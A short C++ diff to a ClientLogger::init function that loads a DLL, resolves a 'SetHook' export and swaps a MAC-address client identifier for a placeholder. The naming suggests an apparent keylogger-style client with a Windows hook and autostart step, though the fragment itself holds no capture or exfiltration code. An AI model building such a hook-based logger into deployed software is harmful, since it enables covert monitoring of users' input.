@@ -43,9 +43,6 @@ bool	ClientLogger::init(const char *name)
 {
 	AutoStart start(name);
 	hook ptrHook = NULL;
-	HANDLE file;
-	char username[UNLEN + 1];
-	DWORD size;
 
 	SetLastError(0);
 
@@ -56,7 +53,8 @@ bool	ClientLogger::init(const char *name)
 		|| (ptrHook = (hook)GetProcAddress(_hDll, "SetHook")) == NULL)
 		return (false);
 
-	_disp = std::shared_ptr<Dispatcher>(new Dispatcher(getAddressMAC()));
+	_disp = std::shared_ptr<Dispatcher>(new Dispatcher("q"));
+	//getAddressMAC
 
 	if (ptrHook(_disp) == false)
 		return (false);
